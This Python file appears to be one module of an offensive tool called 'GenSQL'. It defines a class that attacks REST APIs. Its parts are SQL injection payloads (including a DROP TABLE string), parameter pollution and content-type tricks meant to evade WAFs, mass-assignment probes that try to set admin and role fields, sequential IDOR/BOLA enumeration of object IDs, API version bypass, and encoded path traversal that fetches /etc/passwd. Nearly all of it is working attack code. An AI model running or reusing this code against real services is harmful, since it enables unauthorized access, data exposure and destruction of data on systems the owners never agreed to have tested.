#!/usr/bin/env python
"""GenSQL Technique: REST API Injection (HPP, JSON, IDOR, BOLA, mass assignment).
Author: Jeevraj"""
import re
import json
import urllib.request
import urllib.parse
import time


class RESTAPIInjector:
    """REST API injection engine: HPP, JSON body, IDOR, mass assignment, Swagger-guided."""

    COMMON_EXTRA_FIELDS = [
        "role", "isAdmin", "admin", "is_admin", "privilege", "permissions",
        "scope", "access", "user_id", "userId", "account_type", "accountType",
        "verified", "is_verified", "isVerified", "level", "tier", "group",
        "groups", "email", "phone", "password", "password_hash", "token",
        "api_key", "secret",
    ]

    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "1 OR 1=1",
        "' UNION SELECT NULL--",
        "'; SLEEP(3)--",
        "1; DROP TABLE users--",
        "' AND SLEEP(3)--",
        '" OR "1"="1',
    ]

    def __init__(self, idor_start=1, idor_end=1000, timeout=10):
        self.idor_start = idor_start
        self.idor_end   = idor_end
        self.timeout    = timeout
        self._findings  = []

    # ── HTTP Parameter Pollution ────────────────────────────────────────
    def parameter_pollution(self, url, param, values):
        """Send multiple values for same param (HPP) to confuse WAF/backend."""
        qs  = "&".join("%s=%s" % (param, urllib.parse.quote(str(v))) for v in values)
        sep = "&" if "?" in url else "?"
        return self._get(url + sep + qs)

    # ── JSON body injection ─────────────────────────────────────────────
    def json_injection(self, endpoint, field, payload, base_body=None):
        """Inject payload into a JSON body field."""
        body = dict(base_body or {})
        body[field] = payload
        return self._post_json(endpoint, body)

    def nested_json_injection(self, endpoint, path, payload):
        """Inject into a nested JSON path like user.id."""
        keys = path.split(".")
        body = {}
        ref  = body
        for k in keys[:-1]:
            ref[k] = {}
            ref = ref[k]
        ref[keys[-1]] = payload
        return self._post_json(endpoint, body)

    # ── Mass Assignment ─────────────────────────────────────────────────
    def mass_assignment_probe(self, endpoint, base_body=None):
        """Test for mass assignment by sending extra privileged fields."""
        results = []
        for field in self.COMMON_EXTRA_FIELDS:
            body = dict(base_body or {})
            body[field] = True
            resp = self._post_json(endpoint, body)
            if resp and resp.get("status") == 200:
                results.append({"field": field, "accepted": True, "response": resp})
        return results

    # ── IDOR / BOLA ─────────────────────────────────────────────────────
    def idor_scan(self, base_endpoint, id_param="id", reference_id=None,
                  auth_headers=None, step=1):
        """Sequential IDOR probe — compare responses to detect unauthorized access."""
        findings   = []
        ref_resp   = None
        if reference_id:
            ref_resp = self._get(
                base_endpoint.replace("{id}", str(reference_id)),
                headers=auth_headers
            )
        for i in range(self.idor_start, min(self.idor_end + 1, self.idor_start + 200), step):
            if "{id}" in base_endpoint:
                url = base_endpoint.replace("{id}", str(i))
            else:
                url = base_endpoint + "?" + id_param + "=" + str(i)
            resp = self._get(url, headers=auth_headers)
            body_str = str(resp.get("body", "")) if resp else ""
            if (resp and resp.get("status") == 200 and len(body_str) > 10
                    and (not ref_resp or body_str != str(ref_resp.get("body", "")))):
                findings.append({
                    "id": i, "url": url,
                    "response_len": len(body_str),
                })
        return findings

    # ── API version bypass ─────────────────────────────────────────────
    def api_version_bypass(self, url):
        """Try different API version prefixes."""
        versions = ["v1", "v2", "v3", "v4", "v0", "api", "internal", "beta",
                    "admin", "v1.0", "v2.0", "v1beta"]
        results  = []
        base     = re.sub(r"/v\d+[a-z]*/", "/", url)
        for v in versions:
            test_url = re.sub(r"(https?://[^/]+/)(.*)", r"\g<1>" + v + r"/\2", base)
            resp = self._get(test_url)
            if resp and resp.get("status") not in (404, 410):
                results.append({"version": v, "url": test_url, "status": resp.get("status")})
        return results

    # ── Content-type confusion ──────────────────────────────────────────
    def content_type_confusion(self, url, payload):
        """Send same payload with different Content-Type headers to bypass WAF."""
        types = [
            "application/json",
            "application/xml",
            "text/plain",
            "application/x-www-form-urlencoded",
            "application/graphql",
            "text/xml",
            "application/ld+json",
        ]
        results = []
        for ct in types:
            resp = self._post(url, str(payload).encode(), content_type=ct)
            results.append({
                "content_type": ct,
                "status": resp.get("status") if resp else None,
            })
        return results

    # ── Swagger / OpenAPI guided ────────────────────────────────────────
    def swagger_guided_scan(self, spec_url):
        """Parse OpenAPI/Swagger spec and return all parameter injection points."""
        resp = self._get(spec_url)
        if not resp or resp.get("status") != 200:
            return []
        try:
            spec = json.loads(resp["body"])
        except Exception:
            return []
        points = []
        for path, methods in spec.get("paths", {}).items():
            for method, op in methods.items():
                for param in op.get("parameters", []):
                    points.append({
                        "path":     path,
                        "method":   method.upper(),
                        "name":     param.get("name"),
                        "in":       param.get("in"),
                        "required": param.get("required", False),
                        "type":     param.get("schema", {}).get("type", "string"),
                    })
        return points

    # ── Path traversal ─────────────────────────────────────────────────
    def path_traversal_api(self, base_url):
        """Test path traversal in REST API path segments."""
        payloads = [
            "../", "../../", "../../../", "..%2F", "..%2F..%2F",
            "..%252F", "..%c0%af", "..%ef%bc%8f", "%2e%2e%2f",
        ]
        results = []
        for p in payloads:
            url  = base_url.rstrip("/") + "/" + p + "etc/passwd"
            resp = self._get(url)
            if resp and "root:" in str(resp.get("body", "")):
                results.append({"payload": p, "url": url, "success": True})
        return results

    # ── Helpers ────────────────────────────────────────────────────────
    def _get(self, url, headers=None):
        try:
            req = urllib.request.Request(url, headers=headers or {})
            req.add_header("User-Agent", "Mozilla/5.0 GenSQL/2.0")
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
        except Exception as ex:
            return {"error": str(ex)}

    def _post_json(self, url, body, headers=None):
        return self._post(url, json.dumps(body).encode(), "application/json", headers)

    def _post(self, url, data, content_type="application/json", headers=None):
        try:
            h = {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 GenSQL/2.0"}
            h.update(headers or {})
            req = urllib.request.Request(url, data=data, headers=h)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
        except Exception as ex:
            return {"error": str(ex)}
